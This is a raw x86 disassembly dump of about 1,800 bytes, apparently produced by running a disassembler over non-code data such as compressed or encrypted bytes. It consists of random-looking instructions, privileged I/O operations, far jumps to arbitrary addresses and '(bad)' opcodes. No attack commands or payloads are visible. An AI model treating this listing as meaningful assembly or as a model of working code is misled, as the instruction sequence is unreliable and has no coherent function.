  42ccd4:	cld    
  42ccd5:	lds    eax,FWORD PTR [ebx+0x16024b95]
  42ccdb:	inc    eax
  42ccdc:	out    0x3d,eax
  42ccde:	mov    edi,0xc715dd9d
  42cce3:	sahf   
  42cce4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cce5:	push   ax
  42cce7:	push   ss
  42cce8:	icebp  
  42cce9:	leave  
  42ccea:	aas    
  42cceb:	es ins DWORD PTR es:[edi],dx
  42cced:	enterw 0xefe7,0x47
  42ccf2:	lods   eax,DWORD PTR ds:[esi]
  42ccf3:	push   ecx
  42ccf4:	sub    edx,DWORD PTR [ecx]
  42ccf6:	lods   eax,DWORD PTR ds:[esi]
  42ccf7:	xlat   BYTE PTR ds:[ebx]
  42ccf8:	test   al,0x45
  42ccfa:	fwait
  42ccfb:	call   0xf809:0xda7a9224
  42cd02:	or     DWORD PTR [ebx-0x30321f61],esp
  42cd08:	bound  ebp,QWORD PTR [edx+0x9]
  42cd0b:	retf   
  42cd0c:	dec    esi
  42cd0d:	das    
  42cd0e:	add    al,0x2e
  42cd10:	xor    DWORD PTR [esi],esi
  42cd12:	pop    ecx
  42cd13:	push   edx
  42cd14:	jnp    0x42ccc7
  42cd16:	into   
  42cd17:	inc    eax
  42cd18:	push   es
  42cd19:	aaa    
  42cd1a:	jns    0x42cd1e
  42cd1c:	inc    ebp
  42cd1d:	cmp    BYTE PTR [ecx+edi*8-0x4e9dcb25],0xe3
  42cd25:	jp     0x42cd44
  42cd27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cd28:	adc    ebx,0xa
  42cd2b:	js     0x42cd4f
  42cd2d:	adc    DWORD PTR [ecx-0x6b],ebx
  42cd30:	inc    edx
  42cd31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cd32:	and    eax,edi
  42cd34:	mov    al,ds:0xcc18f5d1
  42cd39:	add    cl,dl
  42cd3b:	jge    0x42cda8
  42cd3d:	mov    dh,0x76
  42cd3f:	je     0x42cce1
  42cd41:	jecxz  0x42ccdd
  42cd43:	pop    esi
  42cd44:	pop    edx
  42cd45:	xlat   BYTE PTR ds:[ebx]
  42cd46:	call   0xf2272c6c
  42cd4b:	shl    DWORD PTR [esp+edi*2],0x68
  42cd4f:	call   0x60e7:0xecaefafe
  42cd56:	sbb    al,0x33
  42cd58:	and    ebp,edx
  42cd5a:	fcomp  QWORD PTR [ebx-0x2]
  42cd5d:	mov    ebp,DWORD PTR [edi+0x7d79af45]
  42cd63:	leave  
  42cd64:	int3   
  42cd65:	adc    BYTE PTR [eax],cl
  42cd67:	sub    DWORD PTR [edi-0x552f05d5],ebx
  42cd6d:	sub    eax,0xbfbd2030
  42cd72:	jbe    0x42cda9
  42cd74:	shl    edx,1
  42cd76:	push   0xffffff93
  42cd78:	pop    ebp
  42cd79:	add    eax,0xeb0a031b
  42cd7e:	enter  0x278a,0xd1
  42cd82:	mov    ds:0x22631ccf,eax
  42cd87:	xor    eax,ebp
  42cd89:	cmp    edx,DWORD PTR [edx]
  42cd8b:	mov    ebp,0x970f1c7c
  42cd90:	jecxz  0x42cdf7
  42cd92:	pop    ds
  42cd93:	neg    BYTE PTR [esi-0x1a]
  42cd96:	push   ebx
  42cd97:	add    al,0x9a
  42cd99:	jns    0x42cd1e
  42cd9b:	mov    eax,ds:0x5f2e8641
  42cda0:	fistp  QWORD PTR [edi]
  42cda2:	adc    BYTE PTR [edx-0xd2e4c13],ch
  42cda8:	inc    ebp
  42cda9:	fucomi st,st(5)
  42cdab:	pop    edi
  42cdac:	outs   dx,BYTE PTR ds:[esi]
  42cdad:	repz popw es
  42cdb0:	cmc    
  42cdb1:	call   0xee7b08e1
  42cdb6:	cmp    al,0xe0
  42cdb8:	outs   dx,DWORD PTR ds:[esi]
  42cdb9:	call   0xd74cb60b
  42cdbe:	inc    esp
  42cdbf:	test   BYTE PTR [edi+0x5cb64185],dh
  42cdc5:	in     al,0xe3
  42cdc7:	push   ebx
  42cdc8:	ret    0x1463
  42cdcb:	push   DWORD PTR [esi]
  42cdcd:	adc    al,0xe6
  42cdcf:	jle    0x42ce11
  42cdd1:	aas    
  42cdd2:	mov    edi,0x54d0bc81
  42cdd7:	addr16 dec eax
  42cdd9:	pop    ebx
  42cdda:	push   ds
  42cddb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cddc:	dec    edx
  42cddd:	pop    ebx
  42cdde:	sub    eax,DWORD PTR [ecx+0x2a81077d]
  42cde4:	dec    ecx
  42cde5:	xor    DWORD PTR [esi],esi
  42cde7:	pop    ss
  42cde8:	pop    eax
  42cde9:	dec    ebx
  42cdea:	(bad)  
  42cdeb:	xor    bl,BYTE PTR [ebp+0x2f2a1aa0]
  42cdf1:	push   ebp
  42cdf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cdf3:	out    0x17,eax
  42cdf5:	loope  0x42ce16
  42cdf7:	pop    ds
  42cdf8:	pop    es
  42cdf9:	push   ss
  42cdfa:	dec    esp
  42cdfb:	and    al,0x92
  42cdfd:	hlt    
  42cdfe:	sub    ecx,DWORD PTR [edx-0x2439a65b]
  42ce04:	repnz mov DWORD PTR [esi],ebp
  42ce07:	pop    ecx
  42ce08:	xchg   esp,eax
  42ce09:	ds xchg ebx,eax
  42ce0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ce0c:	sbb    edi,DWORD PTR [esi+edx*1]
  42ce0f:	in     eax,0x5c
  42ce11:	add    BYTE PTR [edx],dl
  42ce13:	sub    dh,BYTE PTR [esi]
  42ce15:	dec    ebp
  42ce16:	dec    ecx
  42ce17:	inc    ecx
  42ce18:	mov    al,ds:0x8f47ec92
  42ce1d:	dec    ebx
  42ce1e:	mov    ebp,0xf214ccd5
  42ce23:	adc    eax,0xd3f1752f
  42ce28:	(bad)  
  42ce29:	repz push eax
  42ce2b:	clc    
  42ce2c:	int    0x3a
  42ce2e:	mov    ah,0x48
  42ce30:	fild   DWORD PTR [eax+0x2d8e440a]
  42ce36:	pop    ds
  42ce37:	es popf 
  42ce39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ce3a:	sti    
  42ce3b:	mov    WORD PTR [edx+0x56],?
  42ce3e:	pushw  ss
  42ce40:	iret   
  42ce41:	dec    DWORD PTR [edx-0x590c287b]
  42ce47:	into   
  42ce48:	sbb    ecx,DWORD PTR [edi+0x4a]
  42ce4b:	jge    0x42ce8e
  42ce4d:	inc    esi
  42ce4e:	inc    ebp
  42ce4f:	ds jmp 0x42cde2
  42ce52:	retf   
  42ce53:	push   edx
  42ce54:	test   DWORD PTR [esi+eax*2-0x4d560e74],esp
  42ce5b:	mov    ebp,DWORD PTR [ebx-0x4e0b55ea]
  42ce61:	mov    bl,0x4
  42ce63:	enter  0xb34c,0xc7
  42ce67:	stc    
  42ce68:	inc    ebx
  42ce69:	fstp   TBYTE PTR [ebx]
  42ce6b:	lahf   
  42ce6c:	jmp    DWORD PTR [edx+0x25]
  42ce6f:	mov    edi,0xd376851a
  42ce74:	cmp    al,0x89
  42ce76:	loope  0x42ce67
  42ce78:	jns    0x42ce4e
  42ce7a:	cdq    
  42ce7b:	inc    ebx
  42ce7c:	ins    DWORD PTR es:[edi],dx
  42ce7d:	cld    
  42ce7e:	push   ecx
  42ce7f:	add    eax,edx
  42ce81:	push   cs
  42ce82:	mov    ebx,0x9a5bd0bc
  42ce87:	les    ebx,FWORD PTR [ebp+0x460f7bf]
  42ce8d:	test   DWORD PTR [esi],eax
  42ce8f:	adc    eax,0xbc519cde
  42ce94:	retf   0x1d0f
  42ce97:	push   cs
  42ce98:	jmp    0x42cea9
  42ce9a:	fwait
  42ce9b:	sbb    ebx,DWORD PTR [eax-0x69]
  42ce9e:	and    al,0x40
  42cea0:	test   al,0x60
  42cea2:	push   eax
  42cea3:	jmp    ecx
  42cea5:	mov    ebp,0x20cd3a04
  42ceaa:	stos   BYTE PTR es:[edi],al
  42ceab:	aaa    
  42ceac:	sbb    DWORD PTR ds:0xd623d5cb,eax
  42ceb2:	mov    ebp,0x6c057359
  42ceb7:	push   es
  42ceb8:	mov    ds:0x8131021a,eax
  42cebd:	test   edi,ebx
  42cebf:	jge    0x42cf38
  42cec1:	xor    esi,DWORD PTR [ebx+ecx*1-0x9]
  42cec5:	sti    
  42cec6:	xor    ebx,DWORD PTR [edi+ebp*1+0x61]
  42ceca:	xchg   ecx,eax
  42cecb:	mov    bl,0x44
  42cecd:	fild   DWORD PTR [eax]
  42cecf:	test   DWORD PTR [esi+0x3081fd83],ebx
  42ced5:	inc    eax
  42ced6:	iret   
  42ced7:	pusha  
  42ced8:	out    dx,eax
  42ced9:	fcomp  QWORD PTR [eax-0x479a5bef]
  42cedf:	addr16 je 0x42cea1
  42cee2:	enter  0xafee,0xca
  42cee6:	mov    ah,0x8d
  42cee8:	lods   eax,DWORD PTR ds:[esi]
  42cee9:	sub    ah,ah
  42ceeb:	xor    BYTE PTR [eax-0x388c6f99],bl
  42cef1:	push   0x32
  42cef3:	push   ebp
  42cef4:	mov    dl,dl
  42cef6:	push   es
  42cef7:	mov    edi,0x6d602a91
  42cefc:	mov    ebx,0xca7fea4e
  42cf01:	jno    0x42ceab
  42cf03:	leave  
  42cf04:	or     DWORD PTR [eiz*4-0x66939c44],edi
  42cf0b:	sbb    esi,DWORD PTR [eax+0x16]
  42cf0e:	xor    dh,BYTE PTR [esi-0x2ef88982]
  42cf14:	in     al,dx
  42cf15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cf16:	(bad)  
  42cf17:	aas    
  42cf18:	dec    edx
  42cf19:	jmp    0xa3c1:0x6d35b283
  42cf20:	dec    eax
  42cf21:	adc    BYTE PTR ds:0x2ac92393,ah
  42cf27:	cmp    BYTE PTR [edx+0x4f38859c],cl
  42cf2d:	sbb    dl,BYTE PTR [ecx+0x2e72877c]
  42cf33:	jecxz  0x42cf51
  42cf35:	je     0x42cf54
  42cf37:	test   dh,ah
  42cf39:	aas    
  42cf3a:	loope  0x42cfaf
  42cf3c:	pop    eax
  42cf3d:	sbb    DWORD PTR [ebx+0xc1eaeb1],ebx
  42cf43:	scas   al,BYTE PTR es:[edi]
  42cf44:	and    BYTE PTR [edx+edx*1],ah
  42cf47:	(bad)  
  42cf48:	icebp  
  42cf49:	or     BYTE PTR [ebx],ch
  42cf4b:	test   cl,al
  42cf4d:	not    DWORD PTR [ebp-0x76]
  42cf50:	mov    ebp,0x3b9f2177
  42cf55:	mov    dh,BYTE PTR [ebx-0x1d491c3b]
  42cf5b:	adc    ecx,DWORD PTR [edx]
  42cf5d:	in     eax,0xa
  42cf5f:	cmp    ecx,DWORD PTR [edx]
  42cf61:	mov    edi,DWORD PTR [esi]
  42cf63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cf64:	xchg   edi,eax
  42cf65:	xor    ebp,edx
  42cf67:	or     al,0x30
  42cf69:	ret    0x5698
  42cf6c:	int    0x71
  42cf6e:	add    eax,0xd1016191
  42cf73:	dec    ebp
  42cf74:	les    ecx,FWORD PTR [ebp-0x6f]
  42cf77:	data16 sar BYTE PTR [esp+ebx*4-0x4aeddb76],cl
  42cf7f:	jo     0x42cf6e
  42cf81:	xchg   edi,eax
  42cf82:	jl     0x42cfa9
  42cf84:	ins    BYTE PTR es:[edi],dx
  42cf85:	stos   BYTE PTR es:[edi],al
  42cf86:	pushf  
  42cf87:	sbb    ch,BYTE PTR [ebx-0x7dc2ded7]
  42cf8d:	xchg   ecx,ebx
  42cf8f:	and    ebx,DWORD PTR [eax-0x5c]
  42cf92:	mov    esp,0xdebbdf16
  42cf97:	dec    edx
  42cf98:	inc    esp
  42cf99:	xor    al,0x19
  42cf9b:	rol    BYTE PTR [edi+0x1d],1
  42cf9e:	ins    BYTE PTR es:[edi],dx
  42cf9f:	jnp    0x42cfff
  42cfa1:	clc    
  42cfa2:	aaa    
  42cfa3:	jno    0x42cf45
  42cfa5:	xchg   ebp,eax
  42cfa6:	jg     0x42cfeb
  42cfa8:	mov    dh,0x91
  42cfaa:	in     al,0x35
  42cfac:	cmp    al,0xb6
  42cfae:	fstp   DWORD PTR [edi-0x1bc00f83]
  42cfb4:	in     eax,0x36
  42cfb6:	into   
  42cfb7:	pop    es
  42cfb8:	dec    esi
  42cfb9:	mov    edi,0xb919ed4d
  42cfbe:	mov    WORD PTR [edx+0x5af0ed9f],ds
  42cfc4:	dec    edi
  42cfc5:	mov    bl,BYTE PTR [edi-0x22d9b35a]
  42cfcb:	mov    eax,0x3b0faa35
  42cfd0:	adc    al,0x44
  42cfd2:	lds    esp,FWORD PTR [ebx+eiz*2-0x3fa2bf12]
  42cfd9:	outs   dx,DWORD PTR ds:[esi]
  42cfda:	lahf   
  42cfdb:	fcmovu st,st(5)
  42cfdd:	mov    BYTE PTR [ebx-0x1def354a],dh
  42cfe3:	mov    edx,0x3cd620a9
  42cfe8:	jb     0x42cfa8
  42cfea:	cmp    ch,BYTE PTR [edi-0x5f52fd36]
  42cff0:	fistp  WORD PTR [eax]
  42cff2:	jb     0x42cfa4
  42cff4:	shl    DWORD PTR [eax-0x46c2e9b],cl
  42cffa:	inc    eax
  42cffb:	dec    eax
  42cffc:	in     eax,dx
  42cffd:	mov    dl,0xc0
  42cfff:	(bad)  
  42d000:	mov    ch,0x60
  42d002:	icebp  
  42d003:	mov    ebp,0xf38397a0
  42d008:	jmp    edi
  42d00a:	lock cmc 
  42d00c:	fs push eax
  42d00e:	fisubr DWORD PTR [edi+0x31]
  42d011:	std    
  42d012:	shl    BYTE PTR [ecx+0x11808d56],1
  42d018:	mov    ebp,0xc0890356
  42d01d:	or     BYTE PTR es:[esi],dl
  42d020:	iret   
  42d021:	fs inc esp
  42d023:	scas   eax,DWORD PTR es:[edi]
  42d024:	ret    
  42d025:	xor    al,0x44
  42d027:	pop    ebx
  42d028:	jmp    0xd11415a8
  42d02d:	push   ss
  42d02e:	sub    eax,0x9bc93a00
  42d033:	loop   0x42d02e
  42d035:	push   ecx
  42d036:	fadd   DWORD PTR [eax]
  42d038:	mov    dh,0x91
  42d03a:	loopne 0x42d013
  42d03c:	(bad)  
  42d03e:	add    dl,BYTE PTR ds:0x469a285e
  42d044:	xchg   ebp,eax
  42d045:	int3   
  42d046:	cmp    eax,0xf6745874
  42d04b:	and    BYTE PTR [eax+0x1a],0xbc
  42d04f:	push   esi
  42d050:	shr    DWORD PTR ds:0x41978c9a,0x51
  42d057:	clc    
  42d058:	push   ebx
  42d059:	gs mov esi,fs
  42d05c:	jmp    0x42d021
  42d05e:	aaa    
  42d05f:	jne    0x42d08e
  42d061:	mov    ah,0x8a
  42d063:	sbb    ch,BYTE PTR [esi+0x62]
  42d066:	add    al,0x7
  42d068:	push   ecx
  42d069:	stos   DWORD PTR es:[edi],eax
  42d06a:	lods   eax,DWORD PTR ds:[esi]
  42d06b:	inc    edx
  42d06c:	out    dx,eax
  42d06d:	push   cs
  42d06e:	mov    ebp,0xf18d6973
  42d073:	inc    esp
  42d074:	mov    al,0x72
  42d076:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d077:	imul   ecx,edi,0xffffffa2
  42d07a:	jg     0x42d0aa
  42d07c:	out    0x96,al
  42d07e:	xor    dl,BYTE PTR [edx]
  42d080:	imul   ecx,DWORD PTR [edx],0x2a
  42d083:	jns    0x42d0c5
  42d085:	bound  eax,QWORD PTR [ebp+0x75c42469]
  42d08b:	sbb    DWORD PTR [edi-0x6e],ebx
  42d08e:	and    al,0xf9
  42d090:	scas   eax,DWORD PTR es:[edi]
  42d091:	and    bl,dl
  42d093:	data16 (bad) 
  42d095:	mov    eax,0xfe99e5ce
  42d09a:	cdq    
  42d09b:	adc    al,0x6b
  42d09d:	xchg   ecx,eax
  42d09e:	call   0x3437:0x6e59528c
  42d0a5:	(bad)  
  42d0a6:	jl     0x42d04c
  42d0a8:	mov    bh,0x48
  42d0aa:	jne    0x42d122
  42d0ac:	daa    
  42d0ad:	sbb    esi,DWORD PTR [edi]
  42d0af:	inc    eax
  42d0b0:	popa   
  42d0b1:	add    BYTE PTR [eax+0x4d6415ac],cl
  42d0b7:	push   ss
  42d0b8:	sbb    edi,DWORD PTR [eax]
  42d0ba:	xchg   ebx,eax
  42d0bb:	push   ecx
  42d0bc:	and    eax,0x6017e410
  42d0c1:	ret    0x7cee
  42d0c4:	mov    eax,0xbfbe7dc5
  42d0c9:	mov    ecx,0x23dfc13d
  42d0ce:	inc    ebx
  42d0cf:	sbb    BYTE PTR [edi+0x189a6b32],ah
  42d0d5:	test   al,0x34
  42d0d7:	xchg   ebp,eax
  42d0d8:	dec    ebp
  42d0d9:	mov    dl,0x4
  42d0db:	inc    eax
  42d0dc:	xchg   DWORD PTR [eax+0x376e4fa],edi
  42d0e2:	mov    ecx,DWORD PTR [edi+0x2e]
  42d0e5:	push   ebp
  42d0e6:	add    al,0xb1
  42d0e8:	and    esp,DWORD PTR [esi+0x3aacbc7e]
  42d0ee:	jg     0x42d08c
  42d0f0:	arpl   WORD PTR [eax+0x2b],bp
  42d0f3:	cdq    
  42d0f4:	jno    0x42d0f1
  42d0f6:	cmp    eax,0x765c0cf8
  42d0fb:	and    DWORD PTR [edx],ebp
  42d0fd:	mov    edx,0x32d3445a
  42d102:	pop    edi
  42d103:	mov    edx,0xe4f69830
  42d108:	idiv   BYTE PTR [ebx]
  42d10a:	enter  0x8893,0x89
  42d10e:	jne    0x42d182
  42d110:	xchg   edx,eax
  42d111:	inc    edi
  42d112:	aaa    
  42d113:	or     BYTE PTR [ecx+0x5dd6080a],0xc2
  42d11a:	in     eax,dx
  42d11b:	aas    
  42d11c:	mov    ah,0xd2
  42d11f:	xor    cl,BYTE PTR [ecx+0x5d]
  42d122:	mov    ebx,0xcd50ce46
  42d127:	inc    esi
  42d128:	ror    DWORD PTR [ebp-0x4f],cl
  42d12b:	arpl   WORD PTR [ecx],dx
  42d12d:	in     al,dx
  42d12e:	mov    dl,dh
  42d130:	sub    DWORD PTR [edi],0xdc3ad5e9
  42d136:	je     0x42d0e1
  42d138:	retf   
  42d139:	outs   dx,DWORD PTR ds:[esi]
  42d13a:	js     0x42d1a5
  42d13c:	mov    bh,0x3d
  42d13e:	aas    
  42d13f:	jle    0x42d163
  42d141:	mov    gs,WORD PTR [ecx]
  42d143:	cdq    
  42d144:	dec    eax
  42d145:	pushf  
  42d146:	mov    dl,0x88
  42d148:	loop   0x42d0ea
  42d14a:	mov    al,0x83
  42d14c:	pop    ecx
  42d14d:	nop
  42d14e:	les    esi,FWORD PTR [ebx+0x7a04fb44]
  42d154:	(bad)  
  42d155:	clc    
  42d156:	pop    edx
  42d157:	mov    bh,0x5a
  42d159:	cwde   
  42d15a:	xchg   ecx,eax
  42d15b:	mov    eax,ds:0x5f72ec89
  42d160:	fisubr DWORD PTR [eax+0x702e2f6a]
  42d166:	call   0x7210cfe9
  42d16b:	ficomp DWORD PTR [esi-0x7e2f809]
  42d171:	jae    0x42d15b
  42d173:	cwde   
  42d174:	ret    0xf656
  42d177:	push   ebx
  42d178:	sub    al,0xa5
  42d17a:	mov    DWORD PTR ds:0xb9355cb3,0x2a30d36d
  42d184:	loope  0x42d175
  42d186:	dec    ebp
  42d187:	lea    ebx,[eax+0x1157ce71]
  42d18d:	imul   ecx,DWORD PTR [eax-0x22],0x16
  42d191:	xchg   esi,eax
  42d192:	mov    BYTE PTR [ebx+0x170c19a8],bl
  42d198:	outs   dx,BYTE PTR ds:[esi]
  42d199:	ss aas 
  42d19b:	push   0x8a375fa9
  42d1a0:	push   ebx
  42d1a1:	dec    edi
  42d1a2:	inc    esp
  42d1a3:	stos   DWORD PTR es:[edi],eax
  42d1a4:	test   eax,0x7bb686e8
  42d1a9:	ret    0x8770
  42d1ac:	out    dx,eax
  42d1ad:	add    ah,dh
  42d1af:	neg    BYTE PTR [eax-0x13]
  42d1b2:	pop    edi
  42d1b3:	jmp    0xf9293f7c
  42d1b8:	ror    ch,0xf7
  42d1bb:	xchg   esp,eax
  42d1bc:	outs   dx,BYTE PTR ds:[esi]
  42d1bd:	cmp    BYTE PTR [ebp+0x7a6d77b4],ah
  42d1c3:	mov    bl,0xc7
  42d1c5:	push   es
  42d1c6:	or     dh,dl
  42d1c8:	inc    edx
  42d1c9:	not    DWORD PTR [edx-0x7192cb39]
  42d1cf:	or     edi,DWORD PTR [esi+ebx*4]
  42d1d2:	jo     0x42d1f3
  42d1d4:	aam    0x72
  42d1d6:	pusha  
  42d1d7:	push   0xa304b4ee
  42d1dc:	cmp    eax,edx
  42d1de:	jnp    0x42d1e3
  42d1e0:	or     ch,BYTE PTR [esi]
  42d1e2:	cs jb  0x42d244
  42d1e5:	jmp    0xe7d2ac0e
  42d1ea:	and    al,0xbb
  42d1ec:	aas    
  42d1ed:	fistp  WORD PTR [ecx+0x27]
  42d1f0:	fs icebp 
  42d1f2:	or     eax,0xed6a459d
  42d1f7:	(bad)  
  42d1f8:	or     bl,bh
  42d1fa:	ficom  WORD PTR [esi-0x24]
  42d1fd:	push   esp
  42d1fe:	jl     0x42d217
  42d200:	ins    DWORD PTR es:[edi],dx
  42d201:	(bad)  
  42d202:	in     al,dx
  42d203:	add    al,0x57
  42d205:	repz shr DWORD PTR [eax],cl
  42d208:	dec    edx
  42d209:	mov    ch,0xe3
  42d20b:	xor    bl,BYTE PTR [edi+eax*1]
  42d20e:	push   esp
  42d20f:	das    
  42d210:	and    dl,BYTE PTR [ebp+0x71]
  42d213:	ret    
  42d214:	arpl   WORD PTR [esi+0x549600e2],bx
  42d21a:	xchg   esp,eax
  42d21b:	pop    edi
  42d21c:	and    BYTE PTR [ecx],bl
  42d21e:	call   0x29ca:0x937ffca
  42d225:	inc    esp
  42d226:	dec    esp
  42d227:	xchg   ecx,eax
  42d228:	mov    bh,0x9a
  42d22b:	popa   
  42d22c:	push   ss
  42d22d:	in     eax,dx
  42d22e:	lods   eax,DWORD PTR ds:[esi]
  42d22f:	push   ds
  42d230:	fisub  WORD PTR [ebp-0x7180455b]
  42d236:	mov    ah,0x96
  42d238:	fisttp DWORD PTR ds:0x1a14e376
  42d23e:	or     BYTE PTR [edi],cl
  42d240:	pop    ds
  42d241:	in     al,dx
  42d242:	dec    edx
  42d243:	mov    esi,ds
  42d245:	or     eax,0x35e71e23
  42d24a:	in     al,dx
  42d24b:	les    esp,FWORD PTR [edx]
  42d24d:	cli    
  42d24e:	pushf  
  42d24f:	push   cs
  42d250:	leave  
  42d251:	rcl    BYTE PTR [esp+ebp*2-0x39c9ae83],cl
  42d258:	push   eax
  42d259:	lahf   
  42d25a:	fcom   QWORD PTR [esi]
  42d25c:	mov    esp,0x6a328f87
  42d261:	inc    eax
  42d262:	lahf   
  42d263:	dec    edx
  42d264:	inc    ecx
  42d265:	cmova  ecx,DWORD PTR [eax+ecx*1+0x39c5f779]
  42d26d:	cmp    ebx,esp
  42d26f:	sbb    DWORD PTR [ebp+0x6bd2a172],eax
  42d275:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d276:	cmp    ah,BYTE PTR [ebp+0x7b72576c]
  42d27c:	xchg   esp,eax
  42d27d:	jl     0x42d27b
  42d27f:	xlat   BYTE PTR ds:[ebx]
  42d280:	jb     0x42d2c1
  42d282:	dec    esi
  42d283:	xlat   BYTE PTR ds:[ebx]
  42d284:	jp     0x42d2b6
  42d286:	ror    esi,0xf3
  42d289:	pop    edi
  42d28a:	int3   
  42d28b:	mov    ebx,0x6aff6dfe
  42d290:	push   ecx
  42d291:	xchg   ah,ah
  42d293:	or     eax,0x5ac3b823
  42d298:	sbb    DWORD PTR [edi],esi
  42d29a:	mov    ebx,0x89cd49da
  42d29f:	cmp    eax,0x63008380
  42d2a4:	scas   eax,DWORD PTR es:[edi]
  42d2a5:	fld    DWORD PTR [ebp+0x355f485b]
  42d2ab:	icebp  
  42d2ac:	or     edx,DWORD PTR ds:0xadcaf22c
  42d2b2:	repz pop ebx
  42d2b4:	sbb    DWORD PTR [eax+0x33],esp
  42d2b7:	icebp  
  42d2b8:	loope  0x42d2dd
  42d2ba:	fisub  DWORD PTR [eax-0x4779653d]
  42d2c0:	inc    ecx
  42d2c1:	ja     0x42d27b
  42d2c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d2c4:	dec    edi
  42d2c5:	repnz into 
  42d2c7:	shl    bh,0x10
  42d2ca:	mov    bh,BYTE PTR [edx+0x4f]
  42d2cd:	sbb    al,0xa2
  42d2cf:	inc    edi
  42d2d0:	das    
  42d2d1:	shl    DWORD PTR [ebx-0x74],1
  42d2d4:	jns    0x42d314
  42d2d6:	cs mov cl,0x13
  42d2d9:	outs   dx,BYTE PTR ds:[esi]
  42d2da:	or     BYTE PTR [edx+0x77],dl
  42d2dd:	(bad)  
  42d2df:	mul    DWORD PTR [edx]
  42d2e1:	pop    esi
  42d2e2:	popf   
  42d2e3:	pop    edi
  42d2e4:	and    DWORD PTR [eax-0x7c389945],ecx
  42d2ea:	les    ebx,FWORD PTR [esi]
  42d2ec:	stc    
  42d2ed:	lods   al,BYTE PTR ds:[esi]
  42d2ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d2ef:	in     al,dx
  42d2f0:	in     al,dx
  42d2f1:	sbb    ch,BYTE PTR [edx+0x6d]
  42d2f4:	call   0xe302f6fb
  42d2f9:	and    al,0x8d
  42d2fb:	xor    eax,0x9cf9efd1
  42d300:	jle    0x42d348
  42d302:	mov    bl,0x2f
  42d304:	test   BYTE PTR [ecx+0x3655db9c],ch
  42d30a:	xchg   ebp,eax
  42d30b:	sub    BYTE PTR [edi-0x68],0x7
  42d30f:	sahf   
  42d310:	jmp    0xc4710d68
  42d315:	es and al,0xb6
  42d318:	inc    ebp
  42d319:	inc    esi
  42d31a:	jge    0x42d30d
  42d31c:	int3   
  42d31d:	shl    BYTE PTR [ebp-0x73585733],0x11
  42d324:	add    bl,BYTE PTR [ebx+0x72263159]
  42d32a:	js     0x42d362
  42d32c:	stc    
  42d32d:	cli    
  42d32e:	add    DWORD PTR [edi-0x4b],0xffffffe0
  42d332:	bound  ebp,QWORD PTR [ebp+ebp*4+0x28]
  42d336:	mov    ecx,0x35cc3006
  42d33b:	xchg   ebx,eax
  42d33c:	nop
  42d33d:	icebp  
  42d33e:	xor    al,0x72
  42d340:	ss xor eax,0xe7e52a56
  42d346:	xor    esi,DWORD PTR [ecx+0x65]
  42d349:	mov    bl,0x74
  42d34b:	or     BYTE PTR [edx-0x2fe42cdb],dh
  42d351:	cmc    
  42d352:	sbb    eax,0xaf90052d
  42d357:	shl    DWORD PTR [esi+0x4a],1
  42d35a:	jge    0x42d356
  42d35c:	out    dx,al
  42d35d:	test   eax,0x64eab0bd
  42d362:	test   al,0x53
  42d364:	add    eax,0xdafde03b
  42d369:	inc    esi
  42d36a:	or     ebp,edx
  42d36c:	arpl   WORD PTR [ebx],ax
  42d36e:	dec    edi
  42d36f:	jnp    0x42d3bd
  42d371:	xlat   BYTE PTR ds:[ebx]
  42d372:	sub    eax,0x1e087dfc
  42d377:	dec    esi
  42d378:	jmp    0x42d3b8
  42d37a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d37b:	and    DWORD PTR [edi],esi
  42d37d:	sub    dl,ch
  42d37f:	imul   DWORD PTR [edx-0x54]
  42d382:	pop    eax
  42d383:	cmp    DWORD PTR [edx],0xffffffb8
  42d386:	imul   edi,DWORD PTR [esi+0x532fbed5],0xb540344d
  42d390:	dec    esp
  42d391:	sbb    ah,BYTE PTR [eax-0x25]
  42d394:	push   esi
  42d395:	mov    edi,0x52350aa0
  42d39a:	jno    0x42d3e9
  42d39c:	pop    edx
  42d39d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d39e:	jno    0x42d3e0
  42d3a0:	(bad)  
  42d3a1:	loopne 0x42d37c
  42d3a3:	and    DWORD PTR [ebx-0x32],ebp
  42d3a6:	adc    BYTE PTR [eax],bh
  42d3a8:	fisubr DWORD PTR [esi-0xa]
  42d3ab:	stos   BYTE PTR es:[edi],al
  42d3ac:	mov    DWORD PTR [ebx+edx*8],edi
  42d3af:	or     BYTE PTR [ebx+0x5c],0x83
  42d3b3:	and    al,0x53
  42d3b5:	jecxz  0x42d388
  42d3b7:	sbb    DWORD PTR [esi-0x25],esp
  42d3ba:	lds    eax,FWORD PTR [ebx+0x3667e35f]
  42d3c0:	push   ds
  42d3c1:	add    BYTE PTR [eax+0x9179c71],0x5f
  42d3c8:	add    al,0xef
  42d3ca:	dec    ebp
  42d3cb:	add    bh,BYTE PTR ds:[ecx+0x6f865905]
  42d3d2:	(bad)  
  42d3d3:	xor    DWORD PTR [eax],edi
  42d3d5:	push   eax
  42d3d6:	xchg   esp,eax
  42d3d7:	je     0x42d439
  42d3d9:	pop    eax
  42d3da:	js     0x42d43c
  42d3dc:	adc    dl,BYTE PTR [eax]
  42d3de:	ror    ch,cl
  42d3e0:	jae    0x42d370
  42d3e2:	inc    eax
  42d3e3:	mov    ch,0xbd
  42d3e5:	xlat   BYTE PTR ds:[ebx]
  42d3e6:	xor    BYTE PTR [esp+esi*8],0x68
  42d3ea:	imul   eax,ebp,0x7ce3e539
  42d3f0:	mov    ch,0xb6
  42d3f2:	(bad)  
  42d3f3:	ja     0x42d3d0
  42d3f5:	jle    0x42d40a
  42d3f7:	sbb    cl,bh
  42d3f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d3fa:	cmp    eax,DWORD PTR [ebx+0x205d47c0]
  42d400:	xchg   edi,eax
  42d401:	jmp    0x7283:0xc0bc1106
  42d408:	and    DWORD PTR [ecx],ebp
